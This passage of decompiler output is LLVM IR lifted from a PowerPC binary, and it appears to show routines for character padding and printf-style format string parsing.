  %v3_1000cb30 = call i32 @function_10010800(i16* %v2_1000cb30, i32 %v2_1000cb24)
  %v0_1000cb34.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cb34

dec_label_pc_1000cb34:                            ; preds = %dec_label_pc_1000cb04, %dec_label_pc_1000cb2c
  %v0_1000cb34 = phi i32 [ %v0_1000cb10, %dec_label_pc_1000cb04 ], [ %v0_1000cb34.pre, %dec_label_pc_1000cb2c ]
  %v1_1000cb34 = add i32 %v0_1000cb34, 8
  %v2_1000cb34 = inttoptr i32 %v1_1000cb34 to i32*
  %v3_1000cb34 = load i32, i32* %v2_1000cb34, align 4
  %v1_1000cb38 = add i32 %v0_1000cb34, 16
  %v2_1000cb38 = inttoptr i32 %v1_1000cb38 to i32*
  %v3_1000cb38 = load i32, i32* %v2_1000cb38, align 4
  store i32 %v0_1000cb0c, i32* @r31, align 4
  %v2_1000cb40 = sub i32 %v3_1000cb38, %v3_1000cb34
  ret i32 %v2_1000cb40

; uselistorder directives
  uselistorder i32 %v0_1000cb34, { 1, 0 }
  uselistorder i32 %v3_1000cb18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cb34, { 1, 0 }
}

define i32 @function_1000cb54(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000cb54:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1000cb7c3 = icmp eq i32 %arg3, 0
  %v2_1000cb80 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1000cb7c3, label %dec_label_pc_1000cb9c, label %dec_label_pc_1000cb90

dec_label_pc_1000cb78:                            ; preds = %dec_label_pc_1000cb90
  %v1_1000cb78 = add i32 %v0_1000cb78, -1
  store i32 %v1_1000cb78, i32* @r31, align 4
  %v3_1000cb7c = icmp eq i32 %v1_1000cb78, 0
  %v0_1000cb88 = load i32, i32* @r29, align 4
  br i1 %v3_1000cb7c, label %dec_label_pc_1000cb9c.loopexit, label %dec_label_pc_1000cb90

dec_label_pc_1000cb90:                            ; preds = %dec_label_pc_1000cb54, %dec_label_pc_1000cb78
  %v0_1000cb885 = phi i32 [ %v0_1000cb88, %dec_label_pc_1000cb78 ], [ %arg1, %dec_label_pc_1000cb54 ]
  store i32 268487572, i32* @lr, align 4
  %v3_1000cb90 = inttoptr i32 %v0_1000cb885 to i16*
  %v4_1000cb90 = call i32 @function_100108e0(i32 %v2_1000cb80, i32 1, i16* %v3_1000cb90)
  %v3_1000cb94 = icmp eq i32 %v4_1000cb90, 1
  %v0_1000cb78 = load i32, i32* @r31, align 4
  br i1 %v3_1000cb94, label %dec_label_pc_1000cb78, label %dec_label_pc_1000cb9c.loopexit

dec_label_pc_1000cb9c.loopexit:                   ; preds = %dec_label_pc_1000cb78, %dec_label_pc_1000cb90
  %v0_1000cba0.ph = phi i32 [ %v0_1000cb78, %dec_label_pc_1000cb90 ], [ 0, %dec_label_pc_1000cb78 ]
  %v1_1000cba0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000cb9c

dec_label_pc_1000cb9c:                            ; preds = %dec_label_pc_1000cb9c.loopexit, %dec_label_pc_1000cb54
  %v1_1000cba0 = phi i32 [ 0, %dec_label_pc_1000cb54 ], [ %v1_1000cba0.pre, %dec_label_pc_1000cb9c.loopexit ]
  %v0_1000cba0 = phi i32 [ 0, %dec_label_pc_1000cb54 ], [ %v0_1000cba0.ph, %dec_label_pc_1000cb9c.loopexit ]
  %v2_1000cba0 = sub i32 %v1_1000cba0, %v0_1000cba0
  ret i32 %v2_1000cba0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cb9c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb90, { 1, 0 }
}

define i32 @function_1000cbb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000cbb4:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v1_1000cbc0 = and i32 %arg2, 128
  %v3_1000cbc0 = icmp eq i32 %v1_1000cbc0, 0
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000cbc0, label %dec_label_pc_1000cc18, label %dec_label_pc_1000cbe4

dec_label_pc_1000cbe4:                            ; preds = %dec_label_pc_1000cbb4
  %v0_1000cbe4 = call i32 @function_1000df60()
  %v0_1000cbe8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000cbe4, i32* @r31, align 4
  %v0_1000cbf0 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000cbf4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cbf4 = sub i32 %v1_1000cbf4, %v0_1000cbe4
  store i32 %v2_1000cbf4, i32* %r29.global-to-local, align 4
  store i32 %v0_1000cbe4, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1000cbf4, 1
  br i1 %tmp7, label %dec_label_pc_1000cc18, label %dec_label_pc_1000cc04

dec_label_pc_1000cc04:                            ; preds = %dec_label_pc_1000cbe4
  %v1_1000cbe8 = urem i32 %v0_1000cbe8, 128
  store i32 268487688, i32* @lr, align 4
  %v3_1000cc04 = trunc i32 %v1_1000cbe8 to i8
  %v4_1000cc04 = call i32 @function_1000cb54(i32 %v0_1000cbf0, i8 %v3_1000cc04, i32 %v2_1000cbf4)
  %v0_1000cc08 = load i32, i32* @r31, align 4
  store i32 %v0_1000cc08, i32* %r30.global-to-local, align 4
  %v1_1000cc0c = load i32, i32* @r29, align 4
  %v4_1000cc0c = icmp eq i32 %v4_1000cc04, %v1_1000cc0c
  store i32 %v4_1000cc04, i32* @r28, align 4
  br i1 %v4_1000cc0c, label %dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge, label %dec_label_pc_1000cc3c

dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge: ; preds = %dec_label_pc_1000cc04
  %v0_1000cc24.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000cc18

dec_label_pc_1000cc18:                            ; preds = %dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge, %dec_label_pc_1000cbe4, %dec_label_pc_1000cbb4
  %v0_1000cc24 = phi i32 [ %v0_1000cc24.pre, %dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge ], [ %v0_1000cbf0, %dec_label_pc_1000cbe4 ], [ %arg1, %dec_label_pc_1000cbb4 ]
  %v0_1000cc20 = phi i32 [ %v0_1000cc08, %dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge ], [ %v0_1000cbe4, %dec_label_pc_1000cbe4 ], [ %arg3, %dec_label_pc_1000cbb4 ]
  %tmp8 = icmp slt i32 %v0_1000cc20, 1
  br i1 %tmp8, label %dec_label_pc_1000cc38, label %dec_label_pc_1000cc30

dec_label_pc_1000cc30:                            ; preds = %dec_label_pc_1000cc18
  %v0_1000cc1c = load i32, i32* @r27, align 4
  store i32 268487732, i32* @lr, align 4
  %v3_1000cc30 = inttoptr i32 %v0_1000cc24 to i16*
  %v4_1000cc30 = call i32 @function_100108e0(i32 %v0_1000cc1c, i32 %v0_1000cc20, i16* %v3_1000cc30)
  br label %dec_label_pc_1000cc38

dec_label_pc_1000cc38:                            ; preds = %dec_label_pc_1000cc18, %dec_label_pc_1000cc30
  %v1_1000cc38 = phi i32 [ 0, %dec_label_pc_1000cc18 ], [ %v4_1000cc30, %dec_label_pc_1000cc30 ]
  %v0_1000cc38 = load i32, i32* @r28, align 4
  %v2_1000cc38 = add i32 %v0_1000cc38, %v1_1000cc38
  br label %dec_label_pc_1000cc3c

dec_label_pc_1000cc3c:                            ; preds = %dec_label_pc_1000cc04, %dec_label_pc_1000cc38
  %v0_1000cc40 = phi i32 [ %v4_1000cc04, %dec_label_pc_1000cc04 ], [ %v2_1000cc38, %dec_label_pc_1000cc38 ]
  ret i32 %v0_1000cc40

; uselistorder directives
  uselistorder i32 %v0_1000cc20, { 1, 0 }
  uselistorder i32 %v2_1000cbf4, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc38, { 1, 0 }
}

define i32 @function_1000cc54() local_unnamed_addr {
dec_label_pc_1000cc54:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_4()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_4()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000cc58 = load i32, i32* @lr, align 4
  store i32 %v0_1000cc58, i32* %r0.global-to-local, align 4
  %v2_1000cc60 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000cc60, i32* %r30.global-to-local, align 4
  %v0_1000cc64 = load i32, i32* @r3, align 4
  store i32 %v0_1000cc64, i32* %r24.global-to-local, align 4
  %v0_1000cc70 = load i32, i32* @r5, align 4
  store i32 %v0_1000cc70, i32* %r31.global-to-local, align 4
  %v0_1000cc74 = load i32, i32* @r4, align 4
  store i32 %v0_1000cc74, i32* @r29, align 4
  store i32 268487804, i32* @lr, align 4
  %v1_1000cc78 = bitcast i8** %stack_var_-200 to i32*
  %v2_1000cc78 = call i32 @function_1000d2bc(i32* %v1_1000cc78)
  %tmp72 = icmp sgt i32 %v2_1000cc78, -1
  br i1 %tmp72, label %dec_label_pc_1000ccac, label %dec_label_pc_1000cc84

dec_label_pc_1000cc84:                            ; preds = %dec_label_pc_1000cc54
  %v3_1000cc84 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000cc84 = ptrtoint i8* %v3_1000cc84 to i32
  store i32 %v4_1000cc84, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000cc84, i32* @r3, align 4
  %v0_1000cc90 = call i32 @function_1000df60()
  %v3_1000cc94 = icmp eq i32 %v0_1000cc90, 0
  br i1 %v3_1000cc94, label %dec_label_pc_1000d2a4, label %dec_label_pc_1000cc9c

dec_label_pc_1000cc9c:                            ; preds = %dec_label_pc_1000cc84
  %v0_1000cc9c = load i32, i32* @r31, align 4
  %v0_1000cca0 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000cca8.713 to i32), i32* @lr, align 4
  %v3_1000cca4 = inttoptr i32 %v0_1000cca0 to i16*
  %v4_1000cca4 = call i32 @function_100108e0(i32 %v0_1000cc9c, i32 %v0_1000cc90, i16* %v3_1000cca4)
  br label %dec_label_pc_1000d2a4

dec_label_pc_1000ccac:                            ; preds = %dec_label_pc_1000cc54
  %v0_1000ccb0 = load i32, i32* @r31, align 4
  store i32 268487864, i32* @lr, align 4
  %v2_1000ccb4 = call i32 @function_1000d378(i32 %v2_1000cc60, i32 %v0_1000ccb0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v2_1000cd4c = ptrtoint i32* %stack_var_-112 to i32
  %v4_1000cd50 = zext i8 %tmp59 to i32
  %tmp73 = icmp slt i32 %tmp60, 1
  %v2_1000cd74 = ptrtoint i32* %stack_var_-344 to i32
  %v3_1000cd78 = icmp eq i32 %tmp58, 0
  %tmp74 = icmp sgt i32 %tmp58, -1
  %v3_1000cdac = icmp eq i32 %tmp57, 0
  %v2_1000d104 = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000d024 = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000d028 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000ce9c = bitcast i32* %stack_var_-201 to i8*
  %tmp75 = icmp ult i32 %tmp57, 6
  %v3_1000cf78 = icmp eq i32 %tmp57, 1
  %v2_1000cf1c = icmp ugt i32 %tmp57, 2
  %v4_1000ce5c = zext i8 %tmp55 to i32
  %v0_1000d290.pre = load i32, i32* @r29, align 4
  %v1_1000cd7c = add i32 %tmp58, 1
  %v2_1000cdd4 = icmp ugt i32 %tmp57, 7
  %v2_1000cfb0 = icmp ugt i32 %tmp57, 15
  %v2_1000cfe4 = icmp ugt i32 %tmp57, 17
  %v3_1000cfe4 = icmp eq i32 %tmp57, 17
  %v2_1000d08c = icmp ugt i32 %tmp57, 19
  %v3_1000d08c = icmp eq i32 %tmp57, 19
  %v3_1000d0f8 = icmp eq i32 %tmp57, 20
  %v1_1000cdec = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_10019490.715 to i32), i32 -1)
  %v2_1000cdec = inttoptr i32 %v1_1000cdec to i8*
  %v3_1000cf28 = icmp eq i32 %tmp57, 3
  %v3_1000cf38 = icmp eq i32 %tmp57, 4
  %v1_1000cd60 = mul nuw nsw i32 %v4_1000cd50, 8
  %v2_1000cd64 = add i32 %v2_1000cd4c, %v1_1000cd60
  %v1_1000cd68 = add i32 %v2_1000cd64, -8
  br label %dec_label_pc_1000d290

dec_label_pc_1000ccc4.backedge:                   ; preds = %dec_label_pc_1000cd18, %dec_label_pc_1000ccd0
  %storemerge12.in = phi i32 [ %v1_1000cce0, %dec_label_pc_1000ccd0 ], [ %v1_1000cd18, %dec_label_pc_1000cd18 ]
  %v1_1000ccd815 = phi i32 [ %v0_1000ccf0, %dec_label_pc_1000ccd0 ], [ %v1_1000cd18, %dec_label_pc_1000cd18 ]
  %storemerge12 = add i32 %storemerge12.in, 1
  store i32 %storemerge12, i32* @r29, align 4
  br label %dec_label_pc_1000ccc4

dec_label_pc_1000ccc4:                            ; preds = %dec_label_pc_1000ccc4.backedge, %dec_label_pc_1000d290
  %v0_1000ccf0 = phi i32 [ %v1_1000ccd815, %dec_label_pc_1000ccc4.backedge ], [ %v0_1000d290, %dec_label_pc_1000d290 ]
  %v1_1000cce0 = phi i32 [ %storemerge12, %dec_label_pc_1000ccc4.backedge ], [ %v0_1000d290, %dec_label_pc_1000d290 ]
  %v1_1000ccc4 = inttoptr i32 %v1_1000cce0 to i8*
  %v2_1000ccc4 = load i8, i8* %v1_1000ccc4, align 1
  %v3_1000ccc4 = zext i8 %v2_1000ccc4 to i32
  store i32 %v3_1000ccc4, i32* %r0.global-to-local, align 4
  %v3_1000ccc8 = icmp eq i8 %v2_1000ccc4, 0
  br i1 %v3_1000ccc8, label %dec_label_pc_1000ccd8, label %dec_label_pc_1000ccd0

dec_label_pc_1000ccd0:                            ; preds = %dec_label_pc_1000ccc4
  %v3_1000ccd0 = icmp eq i8 %v2_1000ccc4, 37
  br i1 %v3_1000ccd0, label %dec_label_pc_1000ccd8, label %dec_label_pc_1000ccc4.backedge

dec_label_pc_1000ccd8:                            ; preds = %dec_label_pc_1000ccd0, %dec_label_pc_1000ccc4
  %v4_1000ccd8 = icmp eq i32 %v1_1000cce0, %v0_1000ccf0
  br i1 %v4_1000ccd8, label %dec_label_pc_1000cd0c, label %dec_label_pc_1000cce0

dec_label_pc_1000cce0:                            ; preds = %dec_label_pc_1000ccd8
  %v2_1000cce0 = sub i32 %v1_1000cce0, %v0_1000ccf0
  store i32 %v2_1000cce0, i32* @r31, align 4
  %v4_1000cce0 = icmp sgt i32 %v2_1000cce0, 0
  br i1 %v4_1000cce0, label %dec_label_pc_1000ccf0, label %dec_label_pc_1000cd00

dec_label_pc_1000ccf0:                            ; preds = %dec_label_pc_1000cce0
  %v0_1000ccf8 = load i32, i32* %r24.global-to-local, align 4
  store i32 268487936, i32* @lr, align 4
  %v3_1000ccfc = inttoptr i32 %v0_1000ccf8 to i16*
  %v4_1000ccfc = call i32 @function_100108e0(i32 %v0_1000ccf0, i32 %v2_1000cce0, i16* %v3_1000ccfc)
  %v1_1000cd00.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cd00

dec_label_pc_1000cd00:                            ; preds = %dec_label_pc_1000cce0, %dec_label_pc_1000ccf0
  %v1_1000cd08 = phi i32 [ %v1_1000cd00.pre, %dec_label_pc_1000ccf0 ], [ %v2_1000cce0, %dec_label_pc_1000cce0 ]
  %storemerge = phi i32 [ %v4_1000ccfc, %dec_label_pc_1000ccf0 ], [ 0, %dec_label_pc_1000cce0 ]
  %v4_1000cd00 = icmp eq i32 %storemerge, %v1_1000cd08
  br i1 %v4_1000cd00, label %dec_label_pc_1000cd08, label %dec_label_pc_1000d2a0

dec_label_pc_1000cd08:                            ; preds = %dec_label_pc_1000cd00
  %v0_1000cd08 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000cd08 = add i32 %v0_1000cd08, %v1_1000cd08
  store i32 %v2_1000cd08, i32* %r23.global-to-local, align 4
  %v0_1000cd0c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000cd0c

dec_label_pc_1000cd0c:                            ; preds = %dec_label_pc_1000ccd8, %dec_label_pc_1000cd08
  %v0_1000cd18 = phi i32 [ %v0_1000ccf0, %dec_label_pc_1000ccd8 ], [ %v0_1000cd0c.pre, %dec_label_pc_1000cd08 ]
  %v1_1000cd0c = inttoptr i32 %v0_1000cd18 to i8*
  %v2_1000cd0c = load i8, i8* %v1_1000cd0c, align 1
  %v3_1000cd0c = zext i8 %v2_1000cd0c to i32
  store i32 %v3_1000cd0c, i32* %r0.global-to-local, align 4
  %v3_1000cd10 = icmp eq i8 %v2_1000cd0c, 0
  br i1 %v3_1000cd10, label %dec_label_pc_1000d2a4, label %dec_label_pc_1000cd18

dec_label_pc_1000cd18:                            ; preds = %dec_label_pc_1000cd0c
  %v1_1000cd18 = add i32 %v0_1000cd18, 1
  %v2_1000cd18 = inttoptr i32 %v1_1000cd18 to i8*
  %v3_1000cd18 = load i8, i8* %v2_1000cd18, align 1
  %v4_1000cd18 = zext i8 %v3_1000cd18 to i32
  store i32 %v4_1000cd18, i32* %r0.global-to-local, align 4
  %v3_1000cd20 = icmp eq i8 %v3_1000cd18, 37
  br i1 %v3_1000cd20, label %dec_label_pc_1000ccc4.backedge, label %dec_label_pc_1000cd28

dec_label_pc_1000cd28:                            ; preds = %dec_label_pc_1000cd18
  store i32 %v2_1000cc60, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000cd18, i8** %stack_var_-200, align 4
  store i32 268488000, i32* @lr, align 4
  %v3_1000cd3c = call i32 @function_1000d684(i32* %v1_1000cc78, i32 %v1_1000cd18)
  store i32 %v2_1000cc60, i32* @r3, align 4
  store i32 268488008, i32* @lr, align 4
  %v0_1000cd44 = call i32 @function_1000d3d4()
  store i32 %tmp60, i32* %r0.global-to-local, align 4
  store i32 %v2_1000cd4c, i32* %r11.global-to-local, align 4
  store i32 %v4_1000cd50, i32* @r7, align 4
  br i1 %tmp73, label %dec_label_pc_1000cd6c, label %dec_label_pc_1000cd60

dec_label_pc_1000cd60:                            ; preds = %dec_label_pc_1000cd28
  br label %dec_label_pc_1000cd6c

dec_label_pc_1000cd6c:                            ; preds = %dec_label_pc_1000cd28, %dec_label_pc_1000cd60
  %storemerge94 = phi i32 [ %v1_1000cd68, %dec_label_pc_1000cd60 ], [ %v2_1000cd4c, %dec_label_pc_1000cd28 ]
  %v0_1000cd9883 = phi i32 [ %v1_1000cd68, %dec_label_pc_1000cd60 ], [ %v2_1000cd4c, %dec_label_pc_1000cd28 ]
  store i32 %storemerge94, i32* %r10.global-to-local, align 4
  store i32 %v2_1000cd74, i32* @r8, align 4
  store i32 %v1_1000cd7c, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000cd9c.preheader, label %dec_label_pc_1000cd9c.preheader.thread

dec_label_pc_1000cd9c.preheader.thread:           ; preds = %dec_label_pc_1000cd6c
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000cda8

dec_label_pc_1000cd9c.preheader:                  ; preds = %dec_label_pc_1000cd6c
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000cd78, label %dec_label_pc_1000cda8, label %dec_label_pc_1000cd94.preheader

dec_label_pc_1000cd94.preheader:                  ; preds = %dec_label_pc_1000cd9c.preheader
  store i32 %v0_1000cd9883, i32* %stack_var_-344, align 4
  %v1_1000cd9884 = add i32 %v0_1000cd9883, 8
  store i32 %v1_1000cd9884, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000cda489 = add i32 %tmp58, -1
  store i32 %v1_1000cda489, i32* %ctr.global-to-local, align 4
  %v2_1000cda490 = icmp eq i32 %v1_1000cda489, 0
  br i1 %v2_1000cda490, label %dec_label_pc_1000cda8, label %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge

dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge: ; preds = %dec_label_pc_1000cd94.preheader, %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge.dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge_crit_edge
  %v1_1000cd94.pre = phi i32 [ %v1_1000cd94.pre.pre, %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge.dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge_crit_edge ], [ %v2_1000cd74, %dec_label_pc_1000cd94.preheader ]
  %v1_1000cd9c92 = phi i32 [ %v1_1000cd9c, %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge.dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000cd94.preheader ]
  %v1_1000cd9891 = phi i32 [ %v1_1000cd98, %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge.dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge_crit_edge ], [ %v1_1000cd9884, %dec_label_pc_1000cd94.preheader ]
  %v3_1000cd94 = add i32 %v1_1000cd94.pre, %v1_1000cd9c92
  %v4_1000cd94 = inttoptr i32 %v3_1000cd94 to i32*
  store i32 %v1_1000cd9891, i32* %v4_1000cd94, align 4
  %v0_1000cd98 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cd98 = add i32 %v0_1000cd98, 8
  store i32 %v1_1000cd98, i32* %r10.global-to-local, align 4
  %v0_1000cd9c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cd9c = mul i32 %v0_1000cd9c, 4
  store i32 %v1_1000cd9c, i32* %r0.global-to-local, align 4
  %v1_1000cda0 = add i32 %v0_1000cd9c, 1
  store i32 %v1_1000cda0, i32* %r11.global-to-local, align 4
  %v0_1000cda4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cda4 = add i32 %v0_1000cda4, -1
  store i32 %v1_1000cda4, i32* %ctr.global-to-local, align 4
  %v2_1000cda4 = icmp eq i32 %v1_1000cda4, 0
  br i1 %v2_1000cda4, label %dec_label_pc_1000cda8, label %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge.dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge_crit_edge

dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge.dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge_crit_edge: ; preds = %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge
  %v1_1000cd94.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge

dec_label_pc_1000cda8:                            ; preds = %dec_label_pc_1000cd94.preheader, %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge, %dec_label_pc_1000cd9c.preheader.thread, %dec_label_pc_1000cd9c.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000cdac, label %dec_label_pc_1000cdb4, label %dec_label_pc_1000cdd4

dec_label_pc_1000cdb4:                            ; preds = %dec_label_pc_1000cda8
  %v0_1000cdb8 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000cdb8, i32* @r6, align 4
  %tmp99 = icmp slt i32 %v0_1000cdb8, 0
  %v1_1000cdc0 = zext i1 %tmp99 to i32
  %v2_1000cdc0 = ashr i32 %v0_1000cdb8, 31
  %v3_1000cdc0 = and i32 %v2_1000cdc0, -2
  %v4_1000cdc0 = or i32 %v3_1000cdc0, %v1_1000cdc0
  store i32 %v4_1000cdc0, i32* @r5, align 4
  %v1_1000cdc8 = call i32 @__asm_rlwinm(i32 %v0_1000cee4, i32 0, i32 20, i32 23)
  store i32 %v1_1000cdc8, i32* @r4, align 4
  %v1_1000cdcc = inttoptr i32 %v1_1000cdc8 to i16*
  %v2_1000cdcc = call i32 @function_10010bc4(i16* %v1_1000cdcc)
  br label %dec_label_pc_1000d28c

dec_label_pc_1000cdd4:                            ; preds = %dec_label_pc_1000cda8
  br i1 %v2_1000cdd4, label %dec_label_pc_1000cfb0, label %dec_label_pc_1000cddc

dec_label_pc_1000cddc:                            ; preds = %dec_label_pc_1000cdd4
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000cdec = load i8, i8* %v2_1000cdec, align 1
  %v4_1000cdec = zext i8 %v3_1000cdec to i32
  store i32 %v4_1000cdec, i32* %r30.global-to-local, align 4
  %v3_1000cdf0 = icmp eq i8 %v3_1000cdec, 10
  br i1 %v3_1000cdf0, label %dec_label_pc_1000cdf8, label %dec_label_pc_1000ce1c

dec_label_pc_1000cdf8:                            ; preds = %dec_label_pc_1000cddc
  store i32 %v0_1000cee4, i32* %r0.global-to-local, align 4
  %v1_1000cdfc = call i32 @__asm_rlwinm(i32 %v0_1000cee4, i32 27, i32 31, i32 31)
  %v2_1000ce00 = icmp ne i32 %v1_1000cdfc, 0
  %v1_1000ce0c = and i32 %v0_1000cee4, 64
  %v3_1000ce0c = icmp eq i32 %v1_1000ce0c, 0
  %v1_1000ce10 = select i1 %v2_1000ce00, i32 44, i32 87
  store i32 %v1_1000ce10, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ce0c, label %dec_label_pc_1000ce1c, label %dec_label_pc_1000ce18

dec_label_pc_1000ce18:                            ; preds = %dec_label_pc_1000cdf8
  %v1_1000ce18 = or i32 %v1_1000ce10, 128
  store i32 %v1_1000ce18, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ce1c

dec_label_pc_1000ce1c:                            ; preds = %dec_label_pc_1000cddc, %dec_label_pc_1000cdf8, %dec_label_pc_1000ce18
  %v0_1000ce1c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ce1c = icmp ugt i32 %v0_1000ce1c, 5
  br i1 %v2_1000ce1c, label %dec_label_pc_1000ce44, label %dec_label_pc_1000ce24

dec_label_pc_1000ce24:                            ; preds = %dec_label_pc_1000ce1c
  %v3_1000ce24 = icmp eq i32 %v0_1000ce1c, 3
  br i1 %v3_1000ce24, label %dec_label_pc_1000ce2c, label %dec_label_pc_1000ce34

dec_label_pc_1000ce2c:                            ; preds = %dec_label_pc_1000ce24
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ce48

dec_label_pc_1000ce34:                            ; preds = %dec_label_pc_1000ce24
  %v3_1000ce34 = icmp eq i32 %v0_1000ce1c, 1
  br i1 %v3_1000ce34, label %dec_label_pc_1000ce4c, label %dec_label_pc_1000ce48

dec_label_pc_1000ce44:                            ; preds = %dec_label_pc_1000ce1c
  %v0_1000ce44 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000ce44 = sub i32 0, %v0_1000ce44
  store i32 %v1_1000ce44, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ce48

dec_label_pc_1000ce48:                            ; preds = %dec_label_pc_1000ce34, %dec_label_pc_1000ce2c, %dec_label_pc_1000ce44
  br label %dec_label_pc_1000ce4c

dec_label_pc_1000ce4c:                            ; preds = %dec_label_pc_1000ce34, %dec_label_pc_1000ce48
  %storemerge2 = phi i32 [ 11, %dec_label_pc_1000ce48 ], [ 6, %dec_label_pc_1000ce34 ]
  store i32 %storemerge2, i32* @r27, align 4
  %v3_1000ce4c = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000ce4c, i32* %r0.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000ce4c, -1
  br i1 %tmp76, label %dec_label_pc_1000ce60, label %dec_label_pc_1000ce5c

dec_label_pc_1000ce5c:                            ; preds = %dec_label_pc_1000ce4c
  br label %dec_label_pc_1000ce60

dec_label_pc_1000ce60:                            ; preds = %dec_label_pc_1000ce4c, %dec_label_pc_1000ce5c
